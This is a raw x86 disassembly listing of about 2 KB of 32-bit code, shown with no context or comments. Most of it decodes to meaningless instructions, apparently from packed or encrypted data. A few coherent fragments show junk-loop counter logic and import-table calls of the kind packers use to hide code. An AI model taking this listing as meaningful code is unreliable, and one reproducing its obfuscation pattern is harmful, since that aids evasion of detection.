  4081e6:	add    al,0x21
  4081e8:	sub    eax,0x1a5601db
  4081ed:	sub    BYTE PTR [esi+0x5a945eb7],cl
  4081f3:	enter  0xeb0f,0xe2
  4081f7:	call   0xd2e6:0xeb324de2
  4081fe:	test   al,0xbb
  408200:	jmp    0x4081e7
  408202:	shr    DWORD PTR [edx+0x35fd5ea],cl
  408208:	(bad)  
  408209:	iret   
  40820a:	push   cs
  40820b:	dec    ebp
  40820c:	push   ebp
  40820d:	in     eax,dx
  40820e:	sbb    al,BYTE PTR [esp+ebp*1]
  408211:	imul   esi,edx,0x14
  408214:	cmp    edx,DWORD PTR [esi+eiz*1+0x32]
  408218:	loope  0x4081ff
  40821a:	in     eax,0xdd
  40821c:	push   edx
  40821d:	cmp    ebp,DWORD PTR [ebx-0x4a]
  408220:	icebp  
  408221:	loope  0x4081af
  408223:	push   ebp
  408224:	xor    edi,edi
  408226:	add    BYTE PTR [esi-0x3d86e761],cl
  40822c:	hlt    
  40822d:	mov    al,ds:0x59c5badf
  408232:	repnz shl BYTE PTR [ebx-0xb],1
  408236:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408237:	mov    bh,0x49
  408239:	mov    esp,0xacced199
  40823e:	adc    ebp,DWORD PTR [edi+0x18]
  408241:	sti    
  408242:	add    al,0xdd
  408244:	ja     0x4081df
  408246:	rcl    BYTE PTR [ebp+0x4e],1
  408249:	inc    ebx
  40824a:	ret    
  40824b:	inc    esp
  40824c:	xchg   esi,eax
  40824d:	sbb    DWORD PTR [edx-0x3dd086ef],0x824ffcdc
  408257:	inc    esp
  408258:	pop    ebp
  408259:	sti    
  40825a:	rcl    ebx,1
  40825c:	mov    bl,0xbd
  40825e:	mov    edx,DWORD PTR [edx-0x56]
  408261:	jne    0x4082c3
  408263:	retf   0x8963
  408266:	out    dx,al
  408267:	sbb    BYTE PTR [ecx],bh
  408269:	sbb    bh,BYTE PTR [ecx+0x12]
  40826c:	loop   0x40826f
  40826e:	adc    bl,BYTE PTR [edi+0x298316c4]
  408274:	adc    DWORD PTR [ebx-0x7ff13c89],edi
  40827a:	lea    esp,ss:[eax-0x1b]
  40827e:	or     dh,al
  408280:	jbe    0x4082a2
  408282:	aas    
  408283:	inc    esi
  408284:	aam    0x72
  408286:	shl    DWORD PTR [edi],1
  408288:	fs pop esi
  40828a:	or     eax,0xaa8167bb
  40828f:	aas    
  408290:	lods   al,BYTE PTR ds:[esi]
  408291:	push   cs
  408292:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408293:	xor    al,0x59
  408295:	and    eax,0xd992414d
  40829a:	dec    esp
  40829b:	xor    al,0x24
  40829d:	out    dx,al
  40829e:	xchg   BYTE PTR [eax],dh
  4082a0:	mov    cl,0x35
  4082a2:	adc    al,0x5a
  4082a4:	ret    
  4082a5:	lods   eax,DWORD PTR ds:[esi]
  4082a6:	rcr    DWORD PTR [edi+0x77],1
  4082a9:	adc    dl,ah
  4082ab:	adc    al,0xc2
  4082ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082ae:	loop   0x4082a8
  4082b0:	dec    esp
  4082b1:	add    al,0xfd
  4082b3:	stos   BYTE PTR es:[edi],al
  4082b4:	push   esi
  4082b5:	fsubr  DWORD PTR [eax]
  4082b7:	push   0x9689d14d
  4082bc:	jl     0x4082ad
  4082be:	out    0xda,al
  4082c0:	cmc    
  4082c1:	out    0x66,eax
  4082c3:	and    dl,BYTE PTR [eax-0x60]
  4082c6:	outs   dx,BYTE PTR ds:[esi]
  4082c7:	addr16 in eax,0xc1
  4082ca:	push   edx
  4082cb:	jecxz  0x408251
  4082cd:	fs popf 
  4082cf:	sti    
  4082d0:	mov    ?,WORD PTR [ebp-0x63]
  4082d3:	popf   
  4082d4:	xor    BYTE PTR [esi],bh
  4082d6:	fst    DWORD PTR [esp+eax*1+0x39a6a61]
  4082dd:	dec    edi
  4082de:	pushf  
  4082df:	push   edx
  4082e0:	fisttp DWORD PTR [esi+0x50370460]
  4082e6:	push   esp
  4082e7:	in     eax,0x60
  4082e9:	jne    0x408295
  4082eb:	pop    esp
  4082ec:	jbe    0x408345
  4082ee:	and    ecx,ebp
  4082f0:	mov    cs,WORD PTR [ebp+0x37608be2]
  4082f6:	(bad)  
  4082f7:	test   al,0x47
  4082f9:	shr    DWORD PTR [ecx],0x8a
  4082fc:	ficom  DWORD PTR [esi-0x25]
  4082ff:	sub    al,0x7c
  408301:	outs   dx,DWORD PTR ds:[esi]
  408302:	scas   al,BYTE PTR es:[edi]
  408303:	sub    BYTE PTR [ecx-0x2b33d08b],cl
  408309:	push   esp
  40830a:	fs icebp 
  40830c:	das    
  40830d:	xchg   edi,eax
  40830e:	test   al,0xdb
  408310:	ret    0xebf8
  408313:	push   esp
  408314:	outs   dx,BYTE PTR ds:[esi]
  408315:	ins    DWORD PTR es:[edi],dx
  408316:	div    dl
  408318:	mov    eax,ds:0xc6e06e0f
  40831d:	int    0x33
  40831f:	mov    dh,0x80
  408321:	imul   ebp,DWORD PTR cs:[esi],0x51
  408325:	push   0xc1c9ec3e
  40832a:	aam    0x42
  40832c:	mov    ecx,0x3f1706ab
  408331:	add    ecx,DWORD PTR [esi-0x28]
  408334:	test   dh,bl
  408336:	sbb    eax,0x39c333fd
  40833b:	jb     0x4082dd
  40833d:	fwait
  40833e:	pop    ebx
  40833f:	retf   0x2095
  408342:	and    edx,DWORD PTR [ebx+0x3e]
  408345:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408346:	test   DWORD PTR [ebp-0x18],eax
  408349:	enter  0x30c,0x63
  40834d:	repnz push ecx
  40834f:	imul   edi,DWORD PTR [ebx+0x335c8007],0xb323dc2
  408359:	retf   0xf69
  40835c:	test   BYTE PTR [esi-0x11],bh
  40835f:	(bad)  
  408360:	dec    DWORD PTR [ebx+0x81f045]
  408366:	add    al,0x35
  408368:	inc    eax
  408369:	pop    es
  40836a:	jmp    0x4072df
  40836f:	mov    eax,DWORD PTR [ebp-0x1c]
  408372:	cmp    DWORD PTR [eax],edi
  408374:	je     0x4072df
  40837a:	mov    eax,0x800f1c81
  40837f:	jmp    0x4072e6
  408384:	push   ebp
  408385:	mov    ebp,esp
  408387:	sub    esp,0x60
  40838a:	mov    DWORD PTR ds:0x43446f,0x17
  408394:	cmp    DWORD PTR ds:0x43446f,0x0
  40839b:	je     0x4083fd
  4083a1:	cmp    DWORD PTR ds:0x43446f,0x6
  4083a8:	jne    0x4083c8
  4083ae:	push   0x4344d3
  4083b3:	push   0x4c23
  4083b8:	push   0x3f32
  4083bd:	push   0x4c42
  4083c2:	call   DWORD PTR ds:0x413288
  4083c8:	cmp    DWORD PTR ds:0x43446f,0x7
  4083cf:	jne    0x4083e0
  4083d5:	mov    eax,ds:0x43446f
  4083da:	dec    eax
  4083db:	mov    ds:0x43446f,eax
  4083e0:	mov    eax,ds:0x43446f
  4083e5:	dec    eax
  4083e6:	mov    ds:0x43446f,eax
  4083eb:	jmp    0x408394
  4083f0:	movzx  eax,BYTE PTR ds:0x434593
  4083f7:	sbb    DWORD PTR ds:0x434483,eax
  4083fd:	mov    eax,DWORD PTR [ebp+0x8]
  408400:	sbb    DWORD PTR ds:0x434507,0x4487
  40840a:	push   ebx
  40840b:	xor    ebx,ebx
  40840d:	or     ebx,DWORD PTR ds:0x434503
  408413:	sbb    DWORD PTR ds:0x434593,ebx
  408419:	push   esi
  40841a:	jmp    0x4086a2
  40841f:	jmp    DWORD PTR [ecx]
  408421:	lahf   
  408422:	xchg   esp,eax
  408423:	mov    eax,ds:0xe73db59c
  408428:	sbb    bh,bl
  40842a:	(bad)  
  40842b:	and    eax,0xfb03777e
  408430:	fidivr WORD PTR [esi+0x7e]
  408433:	loope  0x4084ad
  408435:	jle    0x4084b5
  408437:	fist   WORD PTR ds:0xe7ef178f
  40843d:	fcom   DWORD PTR [esi]
  40843f:	xchg   DWORD PTR [ebp-0x22],esp
  408442:	jns    0x4083d0
  408444:	mov    fs:0x1265c5dd,al
  40844a:	sub    esi,ebp
  40844c:	bound  edi,QWORD PTR [ecx-0x56]
  40844f:	xor    BYTE PTR [edi-0x6e],al
  408452:	sbb    DWORD PTR [edx],esi
  408454:	jmp    0x3717d18e
  408459:	pushf  
  40845a:	or     BYTE PTR [esi],bh
  40845c:	scas   eax,DWORD PTR es:[edi]
  40845d:	pop    esp
  40845e:	sbb    DWORD PTR [esi+0x500eb931],ebp
  408464:	ins    BYTE PTR es:[edi],dx
  408465:	mov    ebp,ds
  408467:	dec    esi
  408468:	xchg   ecx,eax
  408469:	retf   
  40846a:	and    esi,DWORD PTR [edi+0x1e3047d0]
  408470:	push   esi
  408471:	dec    ebx
  408472:	cmp    eax,0xb6f4d28c
  408477:	mov    bh,0xdf
  408479:	je     0x4084e0
  40847b:	rcr    esp,1
  40847d:	test   eax,edi
  40847f:	xchg   esi,eax
  408480:	mov    cl,al
  408482:	and    BYTE PTR ds:0xf46122a6,bh
  408488:	mov    ch,0x77
  40848a:	ja     0x40847f
  40848c:	addr16 mov bl,ah
  40848f:	jnp    0x408417
  408491:	mov    eax,ds:0xde4bf9bb
  408496:	rcr    edi,0x4
  408499:	shl    BYTE PTR [esi],cl
  40849b:	sbb    esp,esp
  40849d:	cli    
  40849e:	call   0x35fc:0x3784d352
  4084a5:	aam    0xda
  4084a7:	sbb    eax,DWORD PTR [esi+edx*2+0x12]
  4084ab:	clc    
  4084ac:	cmp    BYTE PTR [edi+0x359418a],al
  4084b2:	cmp    DWORD PTR [esi+0x3b],0x3709f37c
  4084b9:	cdq    
  4084ba:	loopne 0x40846c
  4084bc:	sub    eax,0xe55638a0
  4084c1:	rol    DWORD PTR [eax-0x4f1bedaa],0x68
  4084c8:	jo     0x408460
  4084ca:	lahf   
  4084cb:	dec    esi
  4084cc:	jg     0x4084af
  4084ce:	cmp    eax,0x81445576
  4084d3:	or     eax,0x289222dc
  4084d8:	adc    BYTE PTR [eax-0x49],bh
  4084db:	dec    esp
  4084dc:	(bad)  
  4084dd:	sbb    eax,esp
  4084df:	jecxz  0x40850e
  4084e1:	or     DWORD PTR [ecx+0x355a7891],0x23
  4084e8:	pop    edi
  4084e9:	mov    ds:0x3cfd1efd,eax
  4084ee:	and    DWORD PTR [eax-0x19e49d7e],esi
  4084f4:	cli    
  4084f5:	push   cs
  4084f6:	inc    eax
  4084f7:	and    al,0xed
  4084f9:	pop    esp
  4084fa:	imul   ecx,DWORD PTR ds:0xcd66a2c1,0x521e2211
  408504:	and    bl,BYTE PTR [edi-0x31ff063]
  40850a:	mov    ebp,0xae7e526
  40850f:	popf   
  408510:	or     edx,edi
  408512:	std    
  408513:	or     bh,ch
  408515:	push   ebp
  408516:	int    0xb1
  408518:	jmp    0xdc49:0x715520cf
  40851f:	loope  0x408589
  408521:	std    
  408522:	fistp  WORD PTR [edx+0x312a6e82]
  408528:	push   es
  408529:	add    dh,BYTE PTR [ebx-0x608eacde]
  40852f:	mov    esi,0x6e4dc994
  408534:	cmp    BYTE PTR [ecx+0x2ca28a15],dh
  40853a:	pop    ebp
  40853b:	lods   eax,DWORD PTR ds:[esi]
  40853c:	leave  
  40853d:	or     al,0x7a
  40853f:	push   ecx
  408540:	mov    ds:0xaa10760d,eax
  408545:	jp     0x4084cf
  408547:	scas   al,BYTE PTR es:[edi]
  408548:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408549:	cmp    edx,0x7c
  40854c:	pop    ebx
  40854d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40854e:	sub    ch,dh
  408550:	inc    edi
  408551:	push   edi
  408552:	inc    esp
  408553:	dec    esp
  408554:	aas    
  408555:	loop   0x408597
  408557:	xchg   esi,eax
  408558:	pop    edx
  408559:	jb     0x40855b
  40855b:	jno    0x408554
  40855d:	mov    edi,0xe766f135
  408562:	mov    ds:0x827eaeac,eax
  408567:	mov    cl,0x27
  408569:	mov    ds,WORD PTR [ebx-0x47cd723f]
  40856f:	cmp    esp,DWORD PTR [ecx+edx*1+0x5]
  408573:	mov    ebx,0x212a1f3e
  408578:	add    eax,0xcd9b60b1
  40857d:	sbb    edx,DWORD PTR [ecx+0x7dff918e]
  408583:	sbb    eax,0xd9d72fb3
  408588:	int    0x83
  40858a:	js     0x408590
  40858c:	hlt    
  40858d:	mov    cl,0x3e
  40858f:	mov    cl,al
  408591:	push   cs
  408592:	or     cl,BYTE PTR [ebx+0x8201246]
  408598:	jmp    0x503c:0x1d7c76f7
  40859f:	jecxz  0x408587
  4085a1:	ins    DWORD PTR es:[edi],dx
  4085a2:	jb     0x408567
  4085a4:	call   0x50de:0xbcd00c68
  4085ab:	dec    edi
  4085ac:	stc    
  4085ad:	or     eax,0x23303bb5
  4085b2:	add    dl,BYTE PTR [esi+0x2d]
  4085b5:	sar    BYTE PTR [edx],0x4c
  4085b8:	in     eax,0xa4
  4085ba:	mov    bh,0x45
  4085bc:	(bad)  
  4085bd:	rol    DWORD PTR ds:0xb6c87a24,1
  4085c3:	or     eax,0x31ea993c
  4085c8:	push   ecx
  4085c9:	setne  BYTE PTR [edx]
  4085cc:	call   0x569e:0x7f59915d
  4085d3:	mov    ebp,0x5fc2b1fa
  4085d8:	in     eax,dx
  4085d9:	xchg   edi,eax
  4085da:	inc    ebx
  4085db:	idiv   DWORD PTR [ebp-0x71c7390b]
  4085e1:	sti    
  4085e2:	(bad)  
  4085e3:	and    BYTE PTR [esi],dh
  4085e5:	jb     0x408576
  4085e7:	cs je  0x4085ba
  4085ea:	loopne 0x4085c9
  4085ec:	or     eax,0x6c0066c9
  4085f1:	(bad)  
  4085f2:	add    BYTE PTR [ecx],al
  4085f4:	pop    ss
  4085f5:	mov    cl,0xfd
  4085f7:	xor    esi,eax
  4085f9:	sbb    al,0x2
  4085fb:	jmp    DWORD PTR [ecx-0x3b]
  4085fe:	inc    eax
  4085ff:	xchg   esi,eax
  408600:	push   esp
  408601:	push   es
  408602:	fcom   QWORD PTR [edi-0x52ff0a5b]
  408608:	inc    ecx
  408609:	mov    dl,0xd0
  40860b:	inc    esi
  40860c:	mov    ecx,DWORD PTR [esi]
  40860e:	sub    dl,bl
  408610:	pop    ebp
  408611:	cmp    edi,eax
  408613:	test   al,0xda
  408615:	pop    ebx
  408616:	jp     0x40866c
  408618:	pop    esi
  408619:	call   0x3bdd7c52
  40861e:	xchg   edi,eax
  40861f:	call   0x3d928647
  408624:	and    al,0x64
  408626:	xchg   esp,eax
  408627:	sub    ax,0x462d
  40862b:	inc    ebp
  40862c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40862d:	xor    bh,dh
  40862f:	fsub   DWORD PTR [edi]
  408631:	dec    edx
  408632:	add    BYTE PTR [ecx],bl
  408634:	jmp    0xd0b3:0x8fdf136a
  40863b:	inc    DWORD PTR ds:0x252d5489
  408641:	xchg   ecx,eax
  408642:	inc    ebx
  408643:	xor    DWORD PTR [eax+esi*2-0x7e20f1bd],edi
  40864a:	ret    
  40864b:	or     DWORD PTR [ebp-0x45531dd9],esp
  408651:	cld    
  408652:	mov    ebx,0x17193bcd
  408657:	scas   al,BYTE PTR es:[edi]
  408658:	inc    eax
  408659:	pop    eax
  40865a:	mov    ebx,0x6ad70301
  40865f:	jmp    0x40867d
  408661:	aas    
  408662:	imul   esp,DWORD PTR [eax],0xaa3d3070
  408668:	dec    ecx
  408669:	adc    ecx,edi
  40866b:	jb     0x408636
  40866d:	jp     0x4086b1
  40866f:	dec    ebx
  408670:	shr    BYTE PTR [edx],cl
  408672:	mov    ah,0x94
  408674:	test   ah,cl
  408676:	imul   edi,esp,0x7e
  408679:	inc    eax
  40867a:	adc    DWORD PTR [bp+di-0x24],ebp
  40867e:	fs pop edx
  408680:	lahf   
  408681:	aaa    
  408682:	stos   DWORD PTR es:[edi],eax
  408683:	popf   
  408684:	ja     0x4086e4
  408686:	out    dx,eax
  408687:	pop    ebp
  408688:	jmp    0xacb3:0xe7563a1d
  40868f:	jg     0x4086e0
  408691:	into   
  408692:	cdq    
  408693:	int3   
  408694:	xchg   BYTE PTR [ebp-0x39c60f5a],ch
  40869a:	jge    0x408635
  40869c:	adc    BYTE PTR [esi+0x2b],dh
  40869f:	add    al,0x75
  4086a1:	mov    eax,ds:0x510851be
  4086a6:	pop    es
  4086a7:	and    DWORD PTR ds:0x43446f,0x0
  4086b1:	mov    ebx,DWORD PTR ds:0x43446f
  4086b7:	inc    ebx
  4086b8:	mov    DWORD PTR ds:0x43446f,ebx
  4086be:	cmp    DWORD PTR ds:0x43446f,0x8
  4086c5:	jne    0x4086d6
  4086cb:	push   0x2214
  4086d0:	call   DWORD PTR ds:0x41328c
  4086d6:	cmp    DWORD PTR ds:0x43446f,0x7
  4086dd:	jne    0x4086f2
  4086e3:	xor    ebx,ebx
  4086e5:	or     ebx,DWORD PTR ds:0x43446f
  4086eb:	inc    ebx
  4086ec:	mov    DWORD PTR ds:0x43446f,ebx
  4086f2:	cmp    DWORD PTR ds:0x43446f,0x11
  4086f9:	jb     0x4086b1
  4086ff:	xor    eax,esi
  408701:	or     ebx,0x4275
  408707:	mov    ebx,0x327299
  40870c:	add    eax,ebx
  40870e:	push   edi
  40870f:	sub    edi,DWORD PTR ds:0x434503
  408715:	mov    DWORD PTR [ebp-0x18],eax
  408718:	xor    edi,0x561f
  40871e:	jmp    0x4089a6
  408723:	push   esi
  408724:	ja     0x40875d
  408726:	push   ecx
  408727:	aaa    
  408728:	push   ecx
  408729:	jo     0x40879c
  40872b:	(bad)  
  40872c:	mov    eax,0x3af43fc8
  408731:	enter  0x6e78,0xd8
  408735:	jle    0x4087b5
  408737:	loope  0x4087b1
  408739:	jle    0x4087b9
  40873b:	mov    BYTE PTR ds:0x8351ac85,0x4d
  408742:	ds and ebx,DWORD PTR es:[edi+0x6f]
  408747:	mov    dl,0xe9
  408749:	stos   DWORD PTR es:[edi],eax
  40874a:	clc    
  40874b:	int3   
  40874c:	mov    esi,0xa84596bc
  408751:	lods   eax,DWORD PTR ds:[esi]
  408752:	inc    eax
  408753:	sbb    ebx,DWORD PTR gs:[edx-0x3d303108]
  40875a:	mov    ch,0x58
  40875c:	dec    esi
  40875d:	and    eax,0x929f77a2
  408762:	call   0x94e7b6b2
  408767:	push   0xffffff8d
  408769:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40876a:	jb     0x4087e0
  40876c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40876d:	or     DWORD PTR [edx+0xe],esp
  408770:	iret   
  408771:	mov    WORD PTR [edi+0x1e],fs
  408774:	popa   
  408775:	outs   dx,BYTE PTR ds:[esi]
  408776:	cmc    
  408777:	rcr    BYTE PTR [ecx+0x511ea382],1
  40877d:	int    0xe6
  40877f:	cwde   
  408780:	xor    DWORD PTR [edx],eax
  408782:	jae    0x40877d
  408784:	inc    eax
  408785:	ret    0x7385
  408788:	cld    
  408789:	dec    eax
  40878a:	dec    edx
  40878b:	jecxz  0x40876c
  40878d:	(bad)  
  40878f:	sahf   
  408790:	popf   
  408791:	pop    esp
  408792:	mov    al,ds:0xe100a196
  408797:	popf   
  408798:	scas   al,BYTE PTR es:[edi]
  408799:	xchg   edx,eax
  40879a:	or     dl,BYTE PTR [ecx+edi*4+0x7c]
  40879e:	sti    
  40879f:	(bad)  
  4087a0:	jmp    0x40880b
  4087a2:	sti    
  4087a3:	dec    esi
  4087a4:	data16 and BYTE PTR [bx+si+0x307],bl
  4087aa:	in     eax,dx
  4087ab:	hlt    
  4087ac:	mov    dl,0xe5
  4087ae:	or     eax,0xc2d3394d
  4087b3:	icebp  
  4087b4:	push   ebp
  4087b5:	adc    DWORD PTR [eax],edi
  4087b7:	sbb    eax,0x472aa22f
  4087bc:	mov    eax,ds:0x4f107592
  4087c1:	push   ebp
  4087c2:	mov    bh,0x5d
  4087c4:	mov    ecx,0xe027e3fe
  4087c9:	into   
  4087ca:	or     bh,BYTE PTR [ecx-0x61]
  4087cd:	fsub   DWORD PTR [eax+0x76]
  4087d0:	add    eax,0x847cecca
  4087d5:	test   al,0x3e
  4087d7:	dec    edx
  4087d8:	sub    al,0x5e
  4087da:	test   eax,0x4f2b58fa
  4087df:	jle    0x40878d
  4087e1:	xchg   edi,eax
  4087e2:	sbb    ch,BYTE PTR [esi-0x30]
  4087e5:	mov    DWORD PTR cs:[edx-0x4c],esi
  4087e9:	adc    DWORD PTR [edi+esi*4],ebp
  4087ec:	xchg   esp,eax
  4087ed:	add    BYTE PTR [edi],bh
  4087ef:	(bad)  
  4087f0:	jno    0x408844
  4087f2:	ret    
  4087f3:	xor    esp,eax
  4087f5:	push   esp
  4087f6:	mov    ah,0x17
  4087f8:	test   BYTE PTR [esi-0x23b3975],ah
  4087fe:	sbb    DWORD PTR [ebp-0x5e4402a0],ecx
  408804:	ins    DWORD PTR es:[edi],dx
  408805:	add    ecx,ebx
  408807:	cmp    bh,BYTE PTR [eax]
  408809:	std    
  40880a:	and    BYTE PTR [esi],0x71
  40880d:	adc    al,BYTE PTR [edi]
  40880f:	inc    ebp
  408810:	imul   ebp,DWORD PTR [esp+ebp*4-0x71],0x1b
  408815:	push   ebx
  408816:	jmp    0xde48:0xf2eafef1
  40881d:	sub    al,0xc4
  40881f:	fs inc eax
  408821:	popf   
  408822:	retf   0x8f53
  408825:	mov    BYTE PTR [edi+0x754ac930],bl
  40882b:	and    eax,0xa525acd9
  408830:	push   ecx
  408831:	xchg   ebx,eax
  408832:	push   ecx
  408833:	and    edi,DWORD PTR [ecx+0x76]
  408836:	sbb    esi,edi
  408838:	scas   al,BYTE PTR es:[edi]
  408839:	aas    
  40883a:	lods   eax,DWORD PTR ds:[esi]
  40883b:	sub    edi,esp
  40883d:	into   
  40883e:	push   0x8
  408840:	jno    0x408831
  408842:	sahf   
  408843:	mov    dh,0xc4
  408845:	push   edx
  408846:	xor    eax,0x4e9e470
  40884b:	xlat   BYTE PTR ds:[ebx]
  40884c:	cmp    esp,esi
  40884e:	xchg   BYTE PTR [edx-0x57],ah
  408851:	xchg   ebx,eax
  408852:	push   edi
  408853:	xchg   edi,eax
  408854:	xor    BYTE PTR [esi+eiz*1],ah
  408857:	sub    DWORD PTR [ebx+0x59],edx
  40885a:	mov    ah,0xf0
  40885c:	jne    0x408821
  40885e:	inc    ecx
  40885f:	jg     0x4088a5
  408861:	in     eax,0x61
  408863:	das    
  408864:	(bad)  
  408865:	and    ch,bl
  408867:	mov    esp,0x92a0fac
  40886c:	pop    ecx
  40886d:	push   ss
  40886e:	xchg   DWORD PTR [ebx-0x38e3607d],ebp
  408874:	adc    eax,0x728b620d
  408879:	int    0x4e
  40887b:	aam    0x9d
  40887d:	and    al,0xf0
  40887f:	hlt    
  408880:	pop    ecx
  408881:	cwde   
  408882:	int    0x4b
  408884:	sahf   
  408885:	push   cs
  408886:	addr16 inc esp
  408888:	jmp    0x6c8da4d8
  40888d:	push   ecx
  40888e:	push   edx
  40888f:	repnz add DWORD PTR [esi],ebx
  408892:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408893:	std    
  408894:	stc    
  408895:	mov    BYTE PTR [ecx-0x5d4703be],bl
  40889b:	mov    edx,0xd9dc835e
  4088a0:	out    dx,al
  4088a1:	fwait
  4088a2:	jl     0x408911
  4088a4:	inc    eax
  4088a5:	push   esi
  4088a6:	sbb    ebp,DWORD PTR [ebx]
  4088a8:	stc    
  4088a9:	sbb    BYTE PTR [esi],dh
  4088ab:	ficomp WORD PTR ds:0x7aaa6eca
  4088b1:	fnstenv [edx]
  4088b3:	cmp    BYTE PTR [edi+ecx*4+0x15],al
  4088b7:	xor    esp,DWORD PTR [edx]
  4088b9:	mov    cl,0xef
  4088bb:	or     ch,BYTE PTR fs:[ecx]
  4088be:	test   esp,esp
  4088c0:	pop    ebp
  4088c1:	fdivp  st(1),st
  4088c3:	mov    bh,0xb1
  4088c5:	aam    0x94
  4088c7:	fadd   DWORD PTR [edx]
  4088c9:	scas   eax,DWORD PTR es:[edi]
  4088ca:	std    
  4088cb:	fadd   DWORD PTR [ecx-0x2d171ad]
  4088d1:	mov    edx,0x56ad0525
  4088d6:	mov    edi,0xb6bb0bae
  4088db:	repz repnz imul ebx,ebx,0x43
  4088e0:	and    DWORD PTR [ebx+0x45bf96ed],eax
  4088e6:	popa   
  4088e7:	inc    esp
  4088e8:	das    
  4088e9:	pushf  
  4088ea:	jmp    0x4088b7
  4088ec:	loope  0x4088be
  4088ee:	sahf   
  4088ef:	shl    dh,cl
  4088f1:	mov    ah,cl
  4088f3:	fstp   TBYTE PTR [eax-0x1ade8411]
  4088f9:	ret    
  4088fa:	stos   DWORD PTR es:[edi],eax
  4088fb:	inc    esi
  4088fc:	cld    
  4088fd:	test   DWORD PTR [edx],eax
  4088ff:	out    0xcb,al
  408901:	das    
  408902:	aad    0x56
  408904:	jnp    0x40892a
  408906:	repz sub al,0x70
  408909:	xchg   edx,eax
  40890a:	adc    DWORD PTR [edx+0x61],edx
  40890d:	or     ah,bl
  40890f:	cdq    
  408910:	lods   al,BYTE PTR ds:[esi]
  408911:	inc    eax
  408912:	mov    cl,0x5d
  408914:	addr16 mov bl,0xe3
  408917:	mov    WORD PTR [ecx-0x64],?
  40891a:	into   
  40891b:	xlat   BYTE PTR ds:[ebx]
  40891c:	and    esp,DWORD PTR [eax]
  40891e:	shl    esp,0x3b
  408921:	daa    
  408922:	popf   
  408923:	mov    DWORD PTR [ecx],ebx
  408925:	pop    ebp
  408926:	push   ecx
  408927:	mov    bh,0xd7
  408929:	addr16 mov bl,0x9c
  40892c:	push   eax
  40892d:	fidiv  WORD PTR [ebx-0x63]
  408930:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408931:	and    eax,0xb66c523e
  408936:	mov    ebp,0x7d82ce35
  40893b:	jg     0x40891e
  40893d:	mov    al,0xfa
  40893f:	and    esp,DWORD PTR [edx-0x24ece1e8]
  408945:	sbb    DWORD PTR [ebx],ebp
  408947:	xor    al,BYTE PTR [ecx]
  408949:	fmul   DWORD PTR cs:[ecx-0x3e]
  40894d:	addr16 jbe 0x40899c
  408950:	pop    es
  408951:	push   edi
  408952:	mov    ds:0x4ffb8d2c,al
  408957:	pop    edx
  408958:	test   DWORD PTR ds:0x37fc8cd7,ebx
  40895e:	jmp    0x643987fd
  408963:	sub    DWORD PTR [eax],edx
  408965:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408966:	les    ebx,FWORD PTR [edi-0x64]
  408969:	mov    dl,0x70
  40896b:	int3   
  40896c:	sub    BYTE PTR [edi-0x58],ch
  40896f:	push   edx
  408970:	adc    ebp,DWORD PTR [ebx+0x34c160c3]
  408976:	jmp    0x40893d
  408978:	jo     0x408903
  40897a:	dec    edx
  40897b:	sbb    al,0x4b
  40897d:	xchg   edx,eax
  40897e:	mov    eax,0xfca333d3
  408983:	mov    bh,0x59
  408985:	xor    ah,BYTE PTR [ebx+0x4885a3fb]
  40898b:	sbb    al,0x71
  40898d:	sti    
  40898e:	mov    eax,0xb5550326
  408993:	xchg   DWORD PTR [edx+0x71d5b435],esp
  408999:	out    dx,al
  40899a:	or     eax,0xfc2f2c9
  40899f:	xchg   esi,eax
  4089a0:	mov    ebp,?
  4089a2:	jp     0x408927
  4089a4:	jbe    0x40893d
  4089a6:	mov    edi,DWORD PTR [ebp+0x8]
  4089a9:	xor    edi,esi
  4089ab:	not    DWORD PTR ds:0x43446b
  4089b1:	mov    DWORD PTR [ebp-0xc],0xf89c85f6
  4089b8:	mov    DWORD PTR [ebp-0x10],0xf89c8736
  4089bf:	add    edi,ebx
  4089c1:	jmp    0x4092cd
  4089c6:	cmp    edi,0x3f
  4089c9:	jmp    0x408c51
  4089ce:	adc    dl,BYTE PTR [ebx-0x524adccb]
  4089d4:	sbb    al,0xb3
  4089d6:	xchg   ebx,eax
  4089d7:	pop    ds
  4089d8:	adc    cl,cl
  4089da:	aad    0x5f
  4089dc:	jbe    0x40899f
  4089de:	rcr    ebx,1
  4089e0:	jle    0x408a60
  4089e2:	loope  0x408a5c
  4089e4:	jle    0x408a64
  4089e6:	in     al,dx
  4089e7:	jle    0x4089ab
  4089e9:	(bad)  
  4089ea:	xchg   edi,eax
  4089eb:	and    DWORD PTR [ebp-0x67],ebx
  4089ee:	dec    edx
  4089ef:	not    BYTE PTR [eax+0x13]
  4089f2:	sbb    DWORD PTR [ebp-0x739f320c],esp
  4089f8:	sbb    al,0xae
  4089fa:	arpl   WORD PTR [ebp+ebp*4-0x59],dx
  4089fe:	xor    dh,BYTE PTR [ebp+0x3f]
  408a01:	in     al,0xeb
  408a03:	push   0x17
  408a05:	loop   0x4089cf
  408a07:	or     eax,0x91614b2a
  408a0c:	repnz inc esi
  408a0e:	test   al,0x29
  408a10:	jnp    0x4089e4
  408a12:	sub    al,0xa7
  408a14:	clc    
  408a15:	push   ds
  408a16:	push   esp
  408a17:	inc    BYTE PTR [edx]
  408a19:	xchg   DWORD PTR [edx-0x7d],edi
  408a1c:	pop    DWORD PTR [ebp-0x54dc417e]
  408a22:	(bad)  
  408a23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a24:	mov    bh,0x6c
  408a26:	dec    ecx
  408a27:	sbb    edi,ecx
  408a29:	add    esp,DWORD PTR [edi-0x4c]
  408a2c:	sti    
  408a2d:	and    esi,edx
  408a2f:	retf   0xd44c
  408a32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a33:	loop   0x4089bf
  408a35:	aas    
  408a36:	fistp  QWORD PTR ds:0x993d125b
  408a3c:	xchg   ebp,eax
  408a3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a3e:	inc    edx
